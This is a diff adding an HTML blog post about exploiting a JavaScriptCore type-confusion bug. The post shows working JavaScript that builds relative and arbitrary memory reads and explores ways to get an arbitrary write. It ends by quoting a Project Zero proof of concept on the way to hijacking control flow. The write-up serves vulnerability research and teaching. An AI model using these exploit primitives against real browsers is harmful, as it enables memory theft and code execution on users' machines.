+        &lt;span class="n"&gt;resize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the normal butterfly case, it will check the &lt;code&gt;length&lt;/code&gt; and &lt;code&gt;public length&lt;/code&gt; fields, located at &lt;code&gt;-4&lt;/code&gt; and &lt;code&gt;-8&lt;/code&gt; from the butterfly pointer (i.e &lt;code&gt;btrfly[-1]&lt;/code&gt; and &lt;code&gt;btrfly[-2]&lt;/code&gt; respectively). However, when passing &lt;code&gt;Symbol&lt;/code&gt;s in our typed confused cases those array accesses will be out of bounds, and thus potentially controllable. Let’s walk through the two possibilities.&lt;/p&gt;
+&lt;h3 id="oob-memory-is-a-large-value"&gt;OOB memory is a large value&lt;/h3&gt;
+&lt;p&gt;Let’s presume we have a memory layout similar to:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  OOB    OOB
++------------------------------------------+
+|0xffff|0xffff|refcount|length|str base ptr|
++------------------------------------------+
+              ^
+        +---+ |
+        |ptr+-+
+        +---+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The exact OOB values won’t matter, as long as they’re greater than the size of the &lt;code&gt;dst&lt;/code&gt; plus the &lt;code&gt;src&lt;/code&gt;. In this case, &lt;code&gt;resize&lt;/code&gt; in our pseudocode or &lt;code&gt;ensureLength&lt;/code&gt; (&lt;code&gt;[4]&lt;/code&gt;) in the actual code will not trigger a reallocation and object move, resulting in a direct &lt;code&gt;memcpy&lt;/code&gt; on top of &lt;code&gt;refcount&lt;/code&gt; and &lt;code&gt;length&lt;/code&gt;. From here, we can turn this into a relative read infoleak by overwriting the length field.&lt;/p&gt;
+&lt;p&gt;For example, if we store a function reference to &lt;code&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/code&gt; in a variable named &lt;code&gt;busted_concat&lt;/code&gt; and then trigger the bug, like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAA&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
+&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x000042420000ffff&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;asDouble&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+
+&lt;span class="nx"&gt;busted_concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Note: &lt;code&gt;Int64&lt;/code&gt; can be found &lt;a href="https://github.com/saelo/jscpwn/blob/master/int64.js"&gt;here&lt;/a&gt; and is, of course, covered in &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We would then end up with a &lt;code&gt;Symbol&lt;/code&gt; &lt;code&gt;x&lt;/code&gt; with fields:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; refcount length
++----------------------------+
+| 0x4242 |0xffff|str base ptr|
++----------------------------+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;str base ptr&lt;/code&gt; will point to &lt;code&gt;AAAA&lt;/code&gt;, however instead of having a length of &lt;code&gt;4&lt;/code&gt;, it will have a length of &lt;code&gt;0xffff&lt;/code&gt;. To access this memory, we can extract the &lt;code&gt;String&lt;/code&gt; from a &lt;code&gt;Symbol&lt;/code&gt; with:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;charCodeAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1234&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;toString()&lt;/code&gt; in this case is actually kind of complicated under the hood. My understanding is that all strings in JSC are “roped”, meaning any existing substrings are linked together with pointers as opposed to linearly laid out in memory. However this detail doesn’t really affect us, for our purposes a string is created out of our controlled length and the existing string base pointer, with no terminating characters to be concerned with. It is possible to crash here if we were to index outside of mapped memory, but this hasn’t happened in my experience. As an additional minor complication, strings come in two varieties, 8bit and UTF-16. We can easily work around this with a basic heuristic: if we read any values larger than 255 we just assume it is a UTF-16 string.&lt;/p&gt;
+&lt;p&gt;None of this changes the outcome of the snippet above, &lt;code&gt;leak&lt;/code&gt; now contains the contents of OOB memory. Boom, relative memory read :)&lt;/p&gt;
+&lt;h3 id="oob-memory-is-a-zero"&gt;OOB Memory is a zero&lt;/h3&gt;
+&lt;p&gt;On the other hand, let’s assume the OOB memory immediately before our target &lt;code&gt;SymbolImpl&lt;/code&gt; is all zeros. In this case, &lt;code&gt;resize&lt;/code&gt; / &lt;code&gt;ensureLength&lt;/code&gt; &lt;em&gt;will&lt;/em&gt; trigger a reallocation and object move. &lt;code&gt;ensureLength&lt;/code&gt; more or less corresponds to the following pseudocode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;new_btrfly&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;alloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_btrfly&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_btrfly&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Or in words: if the existing butterfly isn’t large enough to hold a combination of the two butterflies, allocate a larger one, copy the existing butterfly contents into it, and assign it. Note that this does not actually do the concatenation, it just makes sure the destination will be large enough when the concatenation is actually performed.&lt;/p&gt;
+&lt;p&gt;This turns out to also be quite useful to us, especially if we already have the relative read above. Assuming we have a &lt;code&gt;SymbolImpl&lt;/code&gt; starting at address &lt;code&gt;0x4008&lt;/code&gt; with a memory layout of:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;          OOB    OOB
+        +------------------------------------------+
+0x4000: |0x0000|0x0000|refcount|length|str base ptr|
+        +------------------------------------------+
+                      ^
+                +---+ |
+                |ptr+-+
+                +---+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And, similar to the large value case above, we trigger the bug:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;read_target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0xdeadbeef&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAA&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
+&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x000042420000ffff&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;asDouble&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;read_target&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;asDouble&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+
+&lt;span class="nx"&gt;busted_concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We end up with a “&lt;code&gt;SymbolImpl&lt;/code&gt;” at a new address, &lt;code&gt;0x8000&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;         refcount length str base ptr
+        +----------------------------+
+0x8000: | 0x4242 |0xffff| 0xdeadbeef |
+        +----------------------------+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In this case, we’ve managed to conjure a complete &lt;code&gt;SymbolImpl&lt;/code&gt;! We might not need to allocate a backing string for this Symbol (i.e. “AAAA”), but doing so can make it slightly easier to debug. The &lt;code&gt;ensureLength&lt;/code&gt; code basically decided to “resize” our &lt;code&gt;SymbolImpl&lt;/code&gt;, and by doing so allowed us to fully control the contents of a new one. This now means that if we do&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;charCodeAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x5555&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We will be dereferencing &lt;code&gt;*(0xdeadbeef + 0x5555)&lt;/code&gt;, giving us a completely arbitrary memory read. Obviously this depends on a relative leak, otherwise we wouldn’t have a valid mapped address to target. Additionally, we could have overwritten the &lt;code&gt;str base pointer&lt;/code&gt; in the non-zero length case (because the memcpy is based on the sizeof the source), but I found this method to be slightly more stable and repeatable.&lt;/p&gt;
+&lt;p&gt;With this done we now have both relative and arbitrary infoleaks :)&lt;/p&gt;
+&lt;h3 id="notes-on-fastmalloc"&gt;Notes on &lt;code&gt;fastMalloc&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;We will get into more detail on this in a second, however I want to cover how we control the first bytes prior the &lt;code&gt;SymbolImpl&lt;/code&gt;, as being able to control which &lt;code&gt;ensureLength&lt;/code&gt; codepath we hit is important (we need to get the relative leak before the absolute). This is partially where targeting &lt;code&gt;jsc&lt;/code&gt; instead of Webkit proper made my life easier: I had more or less deterministic heap layout for all of my runs, specifically:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// this symbol will always pass the ensureLength check&lt;/span&gt;
+&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AAAA&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="c1"&gt;// this symbol will always fail the ensureLength check&lt;/span&gt;
+    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Symbol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;BBBB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To be honest, I didn’t find the root cause for why this was the case; I just ran with it. &lt;code&gt;SymbolImpl&lt;/code&gt; objects here are allocated via &lt;code&gt;fastMalloc&lt;/code&gt;, which seems to be used primarily by the JIT, &lt;code&gt;SymbolImpl&lt;/code&gt;, and &lt;code&gt;StringImpl&lt;/code&gt;. Additionally (and unfortunately) &lt;code&gt;fastMalloc&lt;/code&gt; is used by &lt;code&gt;print()&lt;/code&gt;, meaning if we were interested in porting our exploit from &lt;code&gt;jsc&lt;/code&gt; to WebKit we would likely have to redo most of the heap offsets (in addition to spraying to get control over the &lt;code&gt;ensureLength&lt;/code&gt; codepath).&lt;/p&gt;
+&lt;p&gt;While this approach is untested, something like&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;AAAA&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;blink&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Will cause &lt;code&gt;AAAA&lt;/code&gt; to be allocated inline with the allocation metadata via &lt;code&gt;fastMalloc&lt;/code&gt;, as long as your target string is short enough. By spraying a few &lt;code&gt;blink&lt;/code&gt;’d objects to fill in any holes, it should be possible to to control &lt;code&gt;ensureLength&lt;/code&gt; and get the relative infoleak to make the absolute infoleak.&lt;/p&gt;
+&lt;h2 id="arbitrary-write"&gt;Arbitrary Write&lt;/h2&gt;
+&lt;p&gt;Let’s recap where we are, where we’re trying to go, and what’s left to do:&lt;/p&gt;
+&lt;p&gt;We can now read and leak arbitrary browser memory.
+We have a promising looking primitive for a memory write (the &lt;code&gt;memcpy&lt;/code&gt; in the case where we do not resize). 
+If we can turn that relative memory write into an arbitrary write we can move on to targeting some vtables or saved program counters on the stack, and hijack control flow to win.&lt;/p&gt;
+&lt;p&gt;How hard could this be?&lt;/p&gt;
+&lt;h3 id="failure-nan-boxing"&gt;Failure: NaN boxing&lt;/h3&gt;
+&lt;p&gt;One of the first ideas I had to get an arbitrary write was passing it a numeric value as the &lt;code&gt;dst&lt;/code&gt;. Our &lt;code&gt;busted_concat&lt;/code&gt; can be simplified to a weird version of &lt;code&gt;memcpy()&lt;/code&gt;, and instead of passing it &lt;code&gt;memcpy(Symbol, Array, size)&lt;/code&gt; could we pass it something like &lt;code&gt;memcpy(0x41414141, Array, size)&lt;/code&gt;? We would need to create an object at the address we passed in, but that shouldn’t be too difficult at this point: we have a good infoleak and the ability to instantiate memory with arbitrary values via &lt;code&gt;ArrayWithDouble&lt;/code&gt;. Essentially, this is asking if we can use this function reference to get us a &lt;code&gt;fakeobj()&lt;/code&gt; like primitive. There are basically two possibilities to try, and neither of them work.&lt;/p&gt;
+&lt;p&gt;First, let’s take the integer case. If we pass &lt;code&gt;0x41414141&lt;/code&gt; as the &lt;code&gt;dst&lt;/code&gt; parameter, this will be encoded into a &lt;code&gt;JSValue&lt;/code&gt; of &lt;code&gt;0xffff000041414141&lt;/code&gt;. That’s a non-canonical address, and even if it weren’t, it would be in kernel space. Due to this integer tagging, it is impossible to get a JSValue that is an integer which is also a valid mapped memory address, so the integer path is out.&lt;/p&gt;
+&lt;p&gt;Second, let’s examine what happens if we pass it a double instead: &lt;code&gt;memcpy(new Int64(0x41414141).asDouble(), Array, size)&lt;/code&gt;. In this case, the double should be using all 64 bits of the address, so it might be possible to construct a double who’s representation is a mapped memory location. However, JavaScriptCore handles this case as well: they use a floating point representation which has &lt;code&gt;0x0001000000000000&lt;/code&gt; added to the value when expressed as a &lt;code&gt;JSValue&lt;/code&gt;. This means, like integers, doubles can never correspond to a useful memory address.&lt;/p&gt;
+&lt;p&gt;For more information on this, check out &lt;a href="https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/runtime/JSCJSValue.h#L365"&gt;this comment in JSCJSValue.h&lt;/a&gt; which explains the value tagging in more detail.&lt;/p&gt;
+&lt;h3 id="failure-smashing-fastmalloc"&gt;Failure: Smashing fastMalloc&lt;/h3&gt;
+&lt;p&gt;In creating our  relative read infoleak, we only overwrote the &lt;code&gt;refcount&lt;/code&gt; and &lt;code&gt;length&lt;/code&gt; fields of the target &lt;code&gt;SymbolImpl&lt;/code&gt;. However, this &lt;code&gt;memcpy&lt;/code&gt; should be significantly more useful to us: because the size of the copy is related to the size of the source, we can overwrite up to the OOB size field. Practically, this turns into an arbitrary overwrite of &lt;code&gt;SymbolImpl&lt;/code&gt;s.&lt;/p&gt;
+&lt;p&gt;As mentioned previously, &lt;code&gt;SymbolImpl&lt;/code&gt; get allocated via &lt;code&gt;fastMalloc&lt;/code&gt;. To figure this out, we need to leave JSC and check out the Web Template Framework or WTF. WTF, for lack of a better analogy, forms a kind of stdlib for JSC to be built on top of it. If we look up &lt;code&gt;WTF::SymbolImpl&lt;/code&gt; from our class dump above, we find it in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/SymbolImpl.h#L34"&gt;&lt;code&gt;Source/WTF/wtf/text/SymbolImpl.h&lt;/code&gt;&lt;/a&gt;. Specifically, following the class declarations that are of interest to us:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SymbolImpl&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;UniquedStringImpl&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/UniquedStringImpl.h#L35"&gt;&lt;code&gt;Source/WTF/wtf/text/UniquedStringImpl.h&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;UniquedStringImpl&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;StringImpl&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/WTF/wtf/text/StringImpl.h#L131"&gt;&lt;code&gt;/Source/WTF/wtf/text/StringImpl.h&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;StringImpl&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;WTF_MAKE_NONCOPYABLE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;StringImpl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;WTF_MAKE_FAST_ALLOCATED&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;WTF_MAKE_FAST_ALLOCATED&lt;/code&gt; is a macro which expands to cause objects of this type to be allocated via &lt;code&gt;fastMalloc&lt;/code&gt;. This help forms our target list: anything that is tagged with &lt;code&gt;WTF_MAKE_FAST_ALLOCATED&lt;/code&gt;, or allocated directly via &lt;code&gt;fastMalloc&lt;/code&gt; is suitable, as long as we can force an allocation from the interpreter.&lt;/p&gt;
+&lt;p&gt;To save some space: I was unsuccessful at finding any way to turn this &lt;code&gt;fastMalloc&lt;/code&gt; overflow into an arbitrary write. At once point I was absolutely convinced I had a method of partially overwriting a &lt;code&gt;SymbolImpl&lt;/code&gt;, converting it to a to String, then overwriting that, thus bypassing the flags restriction mentioned earlier... but this didn’t work (I confused &lt;code&gt;JSC::JSString&lt;/code&gt; with &lt;code&gt;WTF::StringImpl&lt;/code&gt;, amongst other problems).&lt;/p&gt;
+&lt;p&gt;All the things I could find to overwrite in the &lt;code&gt;fastMalloc&lt;/code&gt; heap were either &lt;code&gt;String&lt;/code&gt;s (or &lt;code&gt;String&lt;/code&gt;-like things, e.g. &lt;code&gt;Symbol&lt;/code&gt;s) or were JIT primitives I didn’t want to try to understand. Alternatively I could have tried to target &lt;code&gt;fastMalloc&lt;/code&gt; metadata attacks -- for some reason this didn’t occur to me until much later and I haven’t looked at this at all.&lt;/p&gt;
+&lt;p&gt;Remember when I mentioned the potential downsides of targeting &lt;code&gt;jsc&lt;/code&gt; specifically? This is where they start to come into play. It would be really nice at this point to have a richer set of objects to target here, specifically DOM or other browser objects. More objects would give me additional avenues on three fronts: more possibilities to type confuse my existing busted functions, more possibilities to overflow in the &lt;code&gt;fastMalloc&lt;/code&gt; heap, and more possibilities to obtain references to useful functions.&lt;/p&gt;
+&lt;p&gt;At this point I decided to try to find a different chain of functions calls which would use the same bug but give me a reference to a different runtime function.&lt;/p&gt;
+&lt;h2 id="control-flow"&gt;Control Flow&lt;/h2&gt;
+&lt;p&gt;My general workflow when auditing other functions for our candidate pattern was to look at the code exposed via &lt;a href="https://github.com/WebKit/webkit/tree/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins"&gt;&lt;code&gt;builtins&lt;/code&gt;&lt;/a&gt;, find native functions, and then audit those native functions looking for things that had JSValue’s evaluated. While this found other instances of this pattern (e.g. in the RegExp code), they were not usable -- the C++ runtime functions would do additional checks and error out. However when searching, I stumbled onto another p0 bug with the same CVE attributed, &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1036"&gt;p0 bug 1036&lt;/a&gt;. Reproducing from the PoC there:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Intl&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;DateTimeFormat&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
+    &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+
+&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;format&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;valueOf&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;
+
